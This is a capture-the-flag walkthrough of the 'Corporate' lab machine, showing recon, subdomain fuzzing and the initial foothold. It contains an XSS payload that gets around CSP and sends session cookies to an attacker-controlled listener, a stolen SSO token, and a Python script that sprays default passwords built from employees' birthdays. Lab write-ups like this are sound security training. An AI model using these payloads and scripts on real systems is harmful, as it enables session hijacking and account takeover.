---
layout: post
title:  Corporate
description: Corporate is an insane-difficulty Linux machine featuring a feature-rich web attack surface that requires chaining various vulnerabilities to bypass strict Content Security Policies (CSP) and steal an authentication cookie via Cross-Site Scripting (XSS). ...
date:   2024-08-7 16:03:00 +0500
image:  '/images/corporate01.jpg'
tags:   [retired, Insane]
featured: true
---
### Nmap:
* [4] nmap -sC -sV -A 10.129.229.168 > corpmap

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 07:04 CDT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.50% done
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.65% done; ETC: 07:05 (0:00:37 remaining)
┌─[us-dedivip-1]─[10.10.14.103]─[froggiedrinks@htb-balm1hxe0f]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.229.168 > corpmap
┌─[us-dedivip-1]─[10.10.14.103]─[froggiedrinks@htb-balm1hxe0f]─[~]
└──╼ [★]$ cat corpmap 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 07:25 CDT
Nmap scan report for corporate.htb (10.129.229.168)
Host is up (0.0084s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    OpenResty web app server 1.21.4.3
|_http-title: Corporate.HTB
|_http-server-header: openresty/1.21.4.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (94%), Crestron 2-Series (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 5.0 (94%), Linux 5.0 - 5.4 (90%), Linux 4.15 - 5.8 (88%), Linux 5.3 - 5.4 (88%), Linux 2.6.32 (87%), Linux 5.0 - 5.5 (87%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   8.08 ms 10.10.14.1
2   8.34 ms corporate.htb (10.129.229.168)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.34 seconds
```

* Looks like we just have some web ports open.
* Not much going on.
### Fuzzing:
* [4] ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://corporate.htb -H 'Host: FUZZ.corporate.htb' -fs 175  # Filter any response with size 175 since it's the default response size here

* [n] **Subdomains:**
	* support.corporate.htb
	* git.corporate.htb
	* sso.corporate.htb
	* people.corporate.htb

### Web Exploration:
* [n] There is a AI chat bot we can seemingly take advantage of.
	* We are able to send `<html> scripts` through the chat bot and it seems to be rendering the scripts.
		* `XSS` Vulnerable.
	* [*] We attempt `javascript` but it is blocking processing JavaScript with `CSP` **Content-Security-Policy**.
```
`|   | |---| |Content-Security-Policy<br>base-uri 'self'; <br>default-src 'self' http://corporate.htb http://*.corporate.htb; <br>style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://maps.googleapis.com https://maps.gstatic.com; <br>font-src 'self' https://fonts.googleapis.com/ https://fonts.gstatic.com data:; <br>img-src 'self' data: maps.gstatic.com; <br>frame-src https://www.google.com/maps/; <br>object-src 'none'; <br>script-src 'self'|`
	
```

### Exploring available JavaScript:
* [n] Here is a curl command that attempts to access that javascript and shows that its possible to access it.
- [4] curl -sS 'http://corporate.htb/assets/js/analytics.min.js?v=froggie'

```
function _0x30f1(){const _0x150333=['click','sup-sent','6871585qSIxyr','no-cors','1085898PDqYoS','250LWEKDs','corporate-analytics','6nnlMyB','querySelectorAll','stringify','forEach','1165722fDyfWg','form-submit','5PzYZzN','toString','identify','6240144ZcXMmG','corporate-landing','getElementById','textContent','from','track','/analytics/page','360852EeMKpG','466474cDxGuh','7753536zzYRuw','/analytics/track','/analytics/init','init','addEventListener','4txofWe','POST'];_0x30f1=function(){return _0x150333;};return _0x30f1();}const _0xb3bfb7=_0x5b8b;(function(_0x5a12d9,_0x434a74){const _0x144b29=_0x5b8b,_0x31739c=_0x5a12d9();while(!![]){try{const _0x415435=parseInt(_0x144b29(0x19d))/0x1*(parseInt(_0x144b29(0x1a3))/0x2)+-parseInt(_0x144b29(0x190))/0x3+parseInt(_0x144b29(0x19c))/0x4*(-parseInt(_0x144b29(0x192))/0x5)+-parseInt(_0x144b29(0x18c))/0x6*(-parseInt(_0x144b29(0x187))/0x7)+parseInt(_0x144b29(0x195))/0x8+parseInt(_0x144b29(0x19e))/0x9+parseInt(_0x144b29(0x18a))/0xa*(-parseInt(_0x144b29(0x189))/0xb);if(_0x415435===_0x434a74)break;else _0x31739c['push'](_0x31739c['shift']());}catch(_0x5d7a2d){_0x31739c['push'](_0x31739c['shift']());}}}(_0x30f1,0x94c6c));function _0x5b8b(_0x431e7b,_0x1c7489){const _0x30f179=_0x30f1();return _0x5b8b=function(_0x5b8b56,_0x422797){_0x5b8b56=_0x5b8b56-0x187;let _0x38dcb3=_0x30f179[_0x5b8b56];return _0x38dcb3;},_0x5b8b(_0x431e7b,_0x1c7489);}const Analytics=_analytics[_0xb3bfb7(0x1a1)]({'app':_0xb3bfb7(0x196),'version':0x64,'plugins':[{'name':_0xb3bfb7(0x18b),'page':({payload:_0x401b79})=>{const _0x2ae943=_0xb3bfb7;fetch(_0x2ae943(0x19b),{'method':_0x2ae943(0x1a4),'mode':'no-cors','body':JSON['stringify'](_0x401b79)});},'track':({payload:_0x930340})=>{const _0x2dcd80=_0xb3bfb7;fetch(_0x2dcd80(0x19f),{'method':_0x2dcd80(0x1a4),'mode':'no-cors','body':JSON['stringify'](_0x930340)});},'identify':({payload:_0x5cdcc5})=>{const _0x54310b=_0xb3bfb7;fetch(_0x54310b(0x1a0),{'method':_0x54310b(0x1a4),'mode':_0x54310b(0x188),'body':JSON[_0x54310b(0x18e)](_0x5cdcc5)});}}]});Analytics[_0xb3bfb7(0x194)]((froggie)[_0xb3bfb7(0x193)]()),Analytics['page'](),Array[_0xb3bfb7(0x199)](document[_0xb3bfb7(0x18d)]('a'))[_0xb3bfb7(0x18f)](_0x40e926=>{const _0xf9ca0d=_0xb3bfb7;_0x40e926[_0xf9ca0d(0x1a2)](_0xf9ca0d(0x1a5),()=>{const _0x3f9eab=_0xf9ca0d;Analytics[_0x3f9eab(0x19a)]('click',{'text':_0x40e926[_0x3f9eab(0x198)],'href':_0x40e926['href']});});});document[_0xb3bfb7(0x197)](_0xb3bfb7(0x191))&&document[_0xb3bfb7(0x197)](_0xb3bfb7(0x191))[_0xb3bfb7(0x1a2)](_0xb3bfb7(0x1a5),()=>{const _0x142bfa=_0xb3bfb7;Analytics[_0x142bfa(0x19a)](_0x142bfa(0x1a6));})
```

* We can see that its possible to exploit this javascript. We can craft a URL to send the chatbot now to grab some sessions cookies.
```
<meta http-equiv="refresh" content="0; url=http://corporate.htb/%3Cscript+src='/vendor/analytics.min.js'%3E%3C/script%3E%3Cscript+src='/assets/js/analytics.min.js?v=document.location=`http://10.10.14.34:34000/${document.cookie}`'%27%3C/script%3E"/>
```

* Sending this script to the chat bot while having a listening server on our attack box will grab a cookie.
### Cookie Theft:
* [n] Setup your server for cookie theft. `python -m http.server 34000`
	* `/CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MSwibmFtZSI6Ikp1bGlvIiwic3VybmFtZSI6IkRhbmllbCIsImVtYWlsIjoiSnVsaW8uRGFuaWVsQGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MjE3NTk4OTksImV4cCI6MTcyMTg0NjI5OX0.peLklF24DypFH8xEUc2VajwwItqc6R7kHzAAgASQ1fE HTTP/1.1"`
	* We grab a cookie for `CorporateSSo`
	* Set the cooking in your browser. Set the path to `/` and the domain to `.corporate.htb`  /Value=`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MSwibmFtZSI6Ikp1bGlvIiwic3VybmFtZSI6IkRhbmllbCIsImVtYWlsIjoiSnVsaW8uRGFuaWVsQGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MjE3NTk4OTksImV4cCI6MTcyMTg0NjI5OX0.peLklF24DypFH8xEUc2VajwwItqc6R7kHzAAgASQ1fE`

- [n] After setting the cookie then clicking sign in on `people.corporate.htb` we have access to the panel under the user `Julio Daniel`.
	- Access to some panels but nothing really stand out to much at first.
	- We have a `sharing folder` where people can share files.
	- Chat where employees can chat.
		- Clicking on profile images sends us to the users profiles.
			- Vulnerable to `IDOR`. We can navigate between users in the browser by changed the user number.
	- There is an `openvpn` file that i can download. Probably gives access to a VPN to get into the internal network.

### IDOR:
* [*] We are able to perform some IDOR with curl and get the files of other users onto our current users sharing folder. I cant get this to work so I'm moving on.

### Brute Forcing Users:
* [n] Theres an email we can look at that gives us a "On-boarding" playbook. It has a generic password format for new employees.
	* We can use this basic template and brute force all users we know to see if they forgot to change their passwords.
```
#!/usr/bin/env python3

import re
import requests

cookie = {"CorporateSSO": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MywibmFtZSI6IkRhbmdlbG8iLCJzdXJuYW1lIjoiS29jaCIsImVtYWlsIjoiRGFuZ2Vsby5Lb2NoQGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MjIwMTQwMTMsImV4cCI6MTcyMjEwMDQxM30.rL0LS1pTTQoWsE0_nMS1nhJdtR2MVN1U_BHEUgE7E1c"}

for i in range(5000, 5100):
    resp = requests.get(f"http://people.corporate.htb/employee/{i}", cookies=cookie)

    if "Sorry, we couldn't find that employee!" in resp.text:
        print(f"\r[{i}]" + " " * 60, end="")
        continue

    user_name = re.findall(r"(\w+\.\w+)@corporate.htb", resp.text)[0]
    birthday_str = re.findall(r'<th scope="row">Birthday</th>\s+<td>(\d{1,2}/\d{1,2}/\d{4})</td>', resp.text)[0]
    m, d, y = birthday_str.split('/')
    password = f"CorporateStarter{d.zfill(2)}{m.zfill(2)}{y}"

    print(f"\r[{i}] {user_name}: {password}" + " "*30, end="")

    resp_login = requests.post(
        'http://sso.corporate.htb/login', 
        data={'username': user_name, 'password': password},
        allow_redirects=False)
    if "/login?error=Invalid%20username%20or%20password" not in resp_login.text:
        print()

print("\r" + " " * 60 + "\r", end="")
```

* Creating a python script to loop through each user and validate.

* [*] We get some hits!
	* `elwin.jones` is in IT, which is interesting. The other three users are consultants.
```
[5021] elwin.jones: CorporateStarter04041987                                    
[5041] laurie.casper: CorporateStarter18111959                                     
[5055] nya.little: CorporateStarter21061965                                      
[5068] brody.wiza: CorporateStarter14071992    	
```

* We are able to login to `sso.corporate.htb` with these creds.

### OpenVPN Connection:
* [n] We download the `OpenVPN` connection from `elwin.jones` and run it with `sudo openvpn elwin-jones.ovpn`.
	* This creates a `tun1` on our box.
```
2024-07-26 14:14:07 Note: Kernel support for ovpn-dco missing, disabling data channel offload.
2024-07-26 14:14:07 OpenVPN 2.6.3 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
2024-07-26 14:14:07 library versions: OpenSSL 3.0.13 30 Jan 2024, LZO 2.10
2024-07-26 14:14:07 DCO version: N/A
2024-07-26 14:14:07 TCP/UDP: Preserving recently used remote address: [AF_INET]10.129.53.78:1194
2024-07-26 14:14:07 Socket Buffers: R=[212992->212992] S=[212992->212992]
2024-07-26 14:14:07 UDPv4 link local: (not bound)
2024-07-26 14:14:07 UDPv4 link remote: [AF_INET]10.129.53.78:1194
2024-07-26 14:14:07 TLS: Initial packet from [AF_INET]10.129.53.78:1194, sid=c242b566 ae8ef237
2024-07-26 14:14:07 VERIFY OK: depth=1, CN=cn_x8JFkEJtALa8DesC
2024-07-26 14:14:07 VERIFY KU OK
2024-07-26 14:14:07 Validating certificate extended key usage
2024-07-26 14:14:07 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
2024-07-26 14:14:07 VERIFY EKU OK
2024-07-26 14:14:07 VERIFY X509NAME OK: CN=server_xIsQbY7vcIxWACne
2024-07-26 14:14:07 VERIFY OK: depth=0, CN=server_xIsQbY7vcIxWACne
2024-07-26 14:14:07 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, peer certificate: 256 bit ECprime256v1, signature: ecdsa-with-SHA256
2024-07-26 14:14:07 [server_xIsQbY7vcIxWACne] Peer Connection Initiated with [AF_INET]10.129.53.78:1194
2024-07-26 14:14:07 TLS: move_session: dest=TM_ACTIVE src=TM_INITIAL reinit_src=1
2024-07-26 14:14:07 TLS: tls_multi_process: initial untrusted session promoted to trusted
2024-07-26 14:14:07 PUSH: Received control message: 'PUSH_REPLY,route-nopull,route 10.9.0.0 255.255.255.0,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 0,cipher AES-128-GCM'
2024-07-26 14:14:07 Options error: option 'route-nopull' cannot be used in this context ([PUSH-OPTIONS])
2024-07-26 14:14:07 OPTIONS IMPORT: --ifconfig/up options modified
2024-07-26 14:14:07 OPTIONS IMPORT: route options modified
2024-07-26 14:14:07 OPTIONS IMPORT: route-related options modified
2024-07-26 14:14:07 net_route_v4_best_gw query: dst 0.0.0.0
2024-07-26 14:14:07 net_route_v4_best_gw result: via 209.94.56.1 dev ens3
2024-07-26 14:14:07 ROUTE_GATEWAY 209.94.56.1/255.255.252.0 IFACE=ens3 HWADDR=a6:ba:3b:08:49:25
2024-07-26 14:14:07 TUN/TAP device tun1 opened
2024-07-26 14:14:07 net_iface_mtu_set: mtu 1500 for tun1
2024-07-26 14:14:07 net_iface_up: set tun1 up
2024-07-26 14:14:07 net_addr_v4_add: 10.8.0.2/24 dev tun1
2024-07-26 14:14:07 net_route_v4_add: 10.9.0.0/24 via 10.8.0.1 dev [NULL] table 0 metric -1
2024-07-26 14:14:07 Initialization Sequence Completed
2024-07-26 14:14:07 Data Channel: cipher 'AES-128-GCM', peer-id: 0
2024-07-26 14:14:07 Timers: ping 10, ping-restart 120
2024-07-26 14:14:07 Protocol options: explicit-exit-notify 1
```

```
: tun1: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.8.0.2/24 scope global tun1
       valid_lft forever preferred_lft forever
    inet6 fe80::dbb0:e101:a0d:b41b/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

* A simple quick way to verify the host is a real host is with a quick ping.
	* `time for i in {1..254}; do (ping -c 1 10.9.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;`

```
We get the following response:
64 bytes from 10.8.0.2: icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from 10.8.0.1: icmp_seq=1 ttl=64 time=8.73 ms

real	0m0.399s
user	0m0.187s
sys	0m0.195s
```

# Success!
* This appears to be the foothold path.